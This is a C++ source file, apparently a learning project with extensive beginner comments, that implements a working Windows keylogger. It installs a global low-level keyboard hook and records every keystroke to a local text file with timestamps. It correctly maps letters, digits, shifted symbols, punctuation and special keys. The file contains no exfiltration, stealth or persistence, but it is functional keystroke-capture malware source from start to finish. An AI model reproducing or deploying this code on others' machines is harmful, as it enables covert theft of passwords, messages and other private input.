#include<iostream>
#include <windows.h>
#include<fstream>
#include<string>
#include<ctime>
#include<iomanip>

//======================================================================//
/* Mind Map 


*Prepare for global variables ( file stream object, keyboard hook id, isFirstKey boolean)
*create time Helper function (GetFormattedTime) to get the current time and format it as [HH:MM:SS]
---*store current time in a time_t(calendar value) , build object with tm struct,
---*get local time and store it in the tm object by memory level , format the time into a string and return it
*Create LogKey function to log the keystrokes 
[prepare parameters for each virtual key code]
---*open the log file in append mode 
---*if it is the first key of the session, log the session start time and a separator line, then set isFirstKey to false
---*check if Shift key is pressed and if Caps Lock is on
---*handle special keys (space, enter, backspace, tab, ctrl, alt, escape, arrow keys, windows key) by logging their names with timestamps
---*handle letter keys (A-Z) by checking if they should be logged as uppercase or lowercase based on the Shift and Caps Lock states, and log the appropriate character
---*handle number keys (0-9) by checking if Shift is pressed to log either the number or the corresponding symbol, and log the appropriate character
---*handle punctuation and specific characters by checking their virtual key codes and Shift state to log the correct character
---*handle function keys (F1-F12) by logging their names with timestamps
---*handle modifier keys (left/right shift, ctrl, alt) by logging their names with timestamps
---*handle lock keys and special keys (Caps Lock, Num Lock, Scroll Lock, Windows
---*handle unknown keys by logging their virtual key code with a timestamp
---*Save Data to the disk
[Keyboard HOOK callback function]
--*create a callback function (KeyboardProc) that will be called by the system whenever a keyboard event occurs
--*check if nCode is greater than or equal to 0 to determine if the hook should process the event
--*check if wParam is WM_KEYDOWN to determine if a key was pressed
--*cast lParam to a pointer to a KBDLLHOOKSTRUCT structure to access information about the keyboard event
--*get the virtual key code from the structure and call the LogKey function to log the keystroke
--*call CallNextHookEx to pass the event to the next hook in the chain, ensuring that other hooks can also process the event
[main function]]
--*Create a Boolean ConsoleHandler function to handle the console close event and safely shut down the program by logging the session end time and unhooking the keyboard hook
--*Set the console control handler to the ConsoleHandler function using SetConsoleCtrlHandler
--*Get the current process handle using GetModuleHandle(NULL) to use when installing the keyboard hook
--*Install the keyboard hook using SetWindowsHookEx with WH_KEYBOARD_LL for a low-level keyboard hook, the KeyboardProc callback function, the current process handle, and 0 to
--*link the hook globally to all threads
--*Check if the hook was installed successfully by checking if the returned hook handle is NULL, and print an error message if it failed
--*Create a message loop using GetMessage to keep
--*the application running and processing events, translating messages with TranslateMessage and dispatching them with DispatchMessage
--*Clean up resources by logging the session end time and unhooking the keyboard hook before exiting the program
*/

// ======================================================================================================== //



//Global variables

//file stream object
std::ofstream logFile;

//store the id of our keyboard hooks
HHOOK keyboardHook;

//Track if it is the first keystroke of  the session
bool isFirstKey = true ;

//Time Helper
std::string GetFormattedTime() {
	time_t now = time(0); //store current time in celender value

	tm timeinfo; //tm is a struct , which is built in and now it is building object named timeinfo
	localtime_s(&timeinfo, &now); //get the current time variable's memory address and put it into the memory address of timeinfo object

	char buffer[20] ;

	strftime (buffer, sizeof(buffer), "[%H:%M:%S]" , &timeinfo); //formatted into specific display and add it in the buffer

	return std::string(buffer); //c style string C++ string 
};

//Log Keystroke

void LogKey(int VkCode) {
	logFile.open("keylogger.txt", std::ios::app); //append

	if(isFirstKey) { //true
	logFile << "Session Started at : " << GetFormattedTime() << "\n" <<std::endl;
	logFile << std::string(50, '*') << std::endl;

	isFirstKey=false;
	}

	bool ShiftPressed = GetAsyncKeyState(VK_SHIFT) & 0x8000;
	 /* GetAsyncKeyState return 16 bit
 	for pressed characters, check with & 0x8000 . */
	bool capsLockOn = GetKeyState(VK_CAPITAL) & 0x0001;
	/* GetKeyState returns 16 bit for
	 toggled keys, check with & 0x0001 . */

	if(VkCode == VK_SPACE) {
	logFile<<" ";
	}
	else if(VkCode == VK_RETURN) {
	logFile<< "\n" <<GetFormattedTime() <<"[Enter]\n" ;
	}
	else if (VkCode == VK_BACK) {
    	logFile << "\n" << GetFormattedTime() << "[Backspace]\n";
	}
	else if (VkCode == VK_TAB) {
    	logFile << "\n" << GetFormattedTime() << "[Tab]\n";

	}
	else if (VkCode == VK_CONTROL || VkCode == VK_LCONTROL || VkCode == VK_RCONTROL) {
    	logFile << "\n" << GetFormattedTime() << "[Ctrl]\n";
	}
	else if (VkCode == VK_MENU || VkCode == VK_LMENU || VkCode == VK_RMENU) {
    	logFile << "\n" << GetFormattedTime() << "[Alt]\n";
	}
	else if (VkCode == VK_ESCAPE) {
    	logFile << "\n" << GetFormattedTime() << "[Escape]\n";
	}
	else if (VkCode == VK_LEFT) {
    	logFile << "\n" << GetFormattedTime() << "[Left Arrow]\n";
	}
	else if (VkCode == VK_RIGHT) {
    	logFile << "\n" << GetFormattedTime() << "[Right Arrow]\n";
	}
	else if (VkCode == VK_UP) {
    	logFile << "\n" << GetFormattedTime() << "[Up Arrow]\n";
	}
	else if (VkCode == VK_DOWN) {
    	logFile << "\n" << GetFormattedTime() << "[Down Arrow]\n";
	}
	else if (VkCode == VK_LWIN || VkCode == VK_RWIN) {
    	logFile << "\n" << GetFormattedTime() << "[Windows Key]\n";
	}


	//LetterKeys (A-Z)
	//0X41 through 0x5A are A to Z
	else if(VkCode >= 0x41 &&  VkCode <= 0x5A) {
	bool isUpperCase = (ShiftPressed && !capsLockOn) || (!ShiftPressed && capsLockOn) ;

		if(isUpperCase) {
			logFile<<(char)VkCode;
		}else { //for lowercase add 32 to the VKC
			logFile<<(char)(VkCode + 32);
		};
	}

	//numbers Key 0 - 9
	//0x30 too 0x39 = 0 to 9
	else if(VkCode >=0x30 && VkCode <=0x39) {
		if(ShiftPressed) {
			char shiftNumbers[] ={ ')' , '!' , '@', '#', '$', '%', '^', '&', '*', '(' };
			int index = VkCode - 0x30 ;
			logFile << shiftNumbers[index];
			} else {
				logFile << (char)VkCode;
			}
	}


	//punctuation and specific characters

	else if(VkCode == 0xBA || VkCode == 186 ) {
		logFile<<(ShiftPressed ? ':' : ';'); // ? = if , : = else 
	}
	else if(VkCode == 0xBB || VkCode == 187 ) {
		logFile<<(ShiftPressed ? '+' : '='); 
	}
	else if(VkCode == 0xBC || VkCode == 188 ) {
		logFile<<(ShiftPressed ? '<' : ','); 
	}
	else if(VkCode == 0xBD || VkCode == 189 ) {
		logFile<<(ShiftPressed ? '_' : '-'); 
	}
	else if(VkCode == 0xBE || VkCode == 190 ) {
		logFile<<(ShiftPressed ? '>' : '.'); 
	}
	else if(VkCode == 0xBF || VkCode == 191 ) {
		logFile<<(ShiftPressed ? '?' : '/'); 
	}
	else if(VkCode == 0xC0 || VkCode == 192 ) {
		logFile<<(ShiftPressed ? '~' : '`'); 
	}
	else if(VkCode == 0xDB || VkCode == 219 ) {
		logFile<<(ShiftPressed ? '{' : '['); 
	}
	else if(VkCode == 0xDC || VkCode == 220 ) {
		logFile<<(ShiftPressed ? '|' : '\\'); 
	}
	else if(VkCode == 0xDD || VkCode == 221 ) {
		logFile<<(ShiftPressed ? '}' : ']'); 
	}
	else if(VkCode == 0xDE || VkCode == 222 ) {
		logFile<<(ShiftPressed ? '"' : '\''); 
	}

	//functions Keys Vk_F1 through Vk_F12
	else if(VkCode >= VK_F1 && VkCode <= VK_F12) {
		int functionNumber = VkCode - VK_F1 + 1 ;
		logFile << "\n" << GetFormattedTime() << "[F" << functionNumber << "]\n";
	}

	//arrow keys
	else if(VkCode == VK_LEFT) {
		logFile << GetFormattedTime() << "[LEFT ARROW]\n" ;
	}
	else if(VkCode == VK_RIGHT) {
		logFile << GetFormattedTime() << "[RIGHT ARROW]\n" ;
	}
	else if(VkCode == VK_UP) {
		logFile << GetFormattedTime() << "[UP ARROW]\n" ;
	}
	else if(VkCode == VK_DOWN) {
		logFile << GetFormattedTime() << "[DOWN ARROW]\n" ;
	}

	//modifiler keys
	else if(VkCode == 160 || VkCode == 0xA0) { 
		logFile<<GetFormattedTime() <<" [LSHIFT]\n" ;
	}
	else if(VkCode == 161 || VkCode == 0xA1) {
		logFile<<GetFormattedTime() <<" [RSHIFT]\n" ;
	}
	else if(VkCode == 162 || VkCode == 0xA2) {
		logFile<<GetFormattedTime() <<" [LCTRL]\n" ;
	}
	else if(VkCode == 163 || VkCode == 0xA3) {
		logFile<<GetFormattedTime() <<" [RCTRL]\n" ;
	}
	else if(VkCode == 164 || VkCode == 0xA4) {
		logFile<<GetFormattedTime() <<" [LALT]\n" ;
	}
	else if(VkCode == 165 || VkCode == 0xA5) {
		logFile<<GetFormattedTime() <<" [RALT]\n" ;
	}

	//Lock Keys and Special Keys

	else if(VkCode == VK_CAPITAL) {
		logFile<<GetFormattedTime() <<" [CAPS LOCK]\n" ;
	}
	else if(VkCode == VK_NUMLOCK) {
		logFile<<GetFormattedTime() <<" [NUM LOCK]\n" ;
	}
	else if(VkCode == VK_SCROLL) {
		logFile<<GetFormattedTime() <<" [SCROLL LOCK]\n" ;
	}
	else if(VkCode == 0x5B || VkCode == 91) {
		logFile<<GetFormattedTime() <<" [LEFT WINDOWS KEY]\n" ;
	}
	else if(VkCode == 0x5C || VkCode == 92) {
		logFile<<GetFormattedTime() <<" [RIGHT WINDOWS KEY]\n" ;
	}
	else if(VkCode == 0x5D || VkCode == 93) {
		logFile<<GetFormattedTime() <<" [APPLICATIONS KEY]\n" ;
	}

	//Unknown Keys 

	else {
		logFile<<GetFormattedTime() <<" [Unknown Key: " << VkCode << "]\n" ;
	}

	//Save Data to the Disk

	logFile.flush(); //flush the buffer to ensure data is written to the disk
	logFile.close(); //close the file after logging each key
};


/* KeyBoard HOOK Callback function */

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam , LPARAM lParam) {
	 //nCode tells you if the hook should process the event , 
	 //wParam is the message (like keydown or keyup) ,
	 // lParam is a pointer to a KBDLLHOOKSTRUCT structure that contains information about the keyboard event

	if(nCode >= 0 ) {
		if(wParam == WM_KEYDOWN) {
			KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam; //cast the lParam to a pointer to KBDLLHOOKSTRUCT

			int VkCode = pKeyboard->vkCode; //get the virtual key code from the structure
			LogKey(VkCode); //call the LogKey function to log the keystroke
		}
	}


	return CallNextHookEx(keyboardHook, nCode, wParam, lParam); //pass the event to the next hook in the chain
};

//main function

BOOL WINAPI ConsoleHandler(DWORD dwtype) { //safely shutting the program 
	if(dwtype == CTRL_CLOSE_EVENT) {
		logFile.open("keylogger.txt", std::ios::app);
		if(logFile.is_open()) {
			logFile << "\nSession Ended at : " << GetFormattedTime() <<std::endl;
			logFile.flush();
			logFile.close();
		}

		if(keyboardHook != NULL) {
			UnhookWindowsHookEx(keyboardHook);
		}

	return true;
	}

	return FALSE;

};

int main() {
	//Set the console control handler to handle the console close event
	SetConsoleCtrlHandler(ConsoleHandler, TRUE);


	//Get Process handle 
	HINSTANCE hInstance = GetModuleHandle(NULL);

	//Install the keyboard hook
	keyboardHook = SetWindowsHookEx(
		WH_KEYBOARD_LL,  //The Hook Type (WH_KEYBOARD_LL for low-level keyboard hook)
		KeyboardProc,  //Pointer to the hook callback above (KeyboardProc)
		hInstance,    //Current process handle (hInstance)
		 0);     //0 means link globally to all threads
	

	//Check if success

	if(keyboardHook == NULL) {
		std::cerr << "Failed" << std::endl;
		return 1;
	};

	//Message loop to keep the application running and processing events

	MSG msg; // allocate memory for a MSG structure to store messages retrieved from the message queue
	BOOL result; //return value of GetMessage function
	while((result = GetMessage(&msg, NULL, 0, 0)) != 0) { //GetMessage retrieves messages from the message queue and stores them in the msg structure
		if(result == -1) {
			std::cerr << "Error" << std::endl;
			break;
		} else {
			TranslateMessage(&msg); //TranslateMessage translates virtual-key messages into character messages
			DispatchMessage(&msg); //DispatchMessage dispatches a message to a window procedure
		}
	};

	//Clean up resources
	logFile.open("keylogger.txt", std::ios::app);
	if(logFile.is_open()) {
		logFile << "\nSession Ended at : " << GetFormattedTime() <<std::endl;
		logFile.flush();
		logFile.close();
	}
	UnhookWindowsHookEx(keyboardHook); //UnhookWindowsHookEx removes the keyboard hook

	std::cout << "Exiting" << std::endl;



	return 0;
}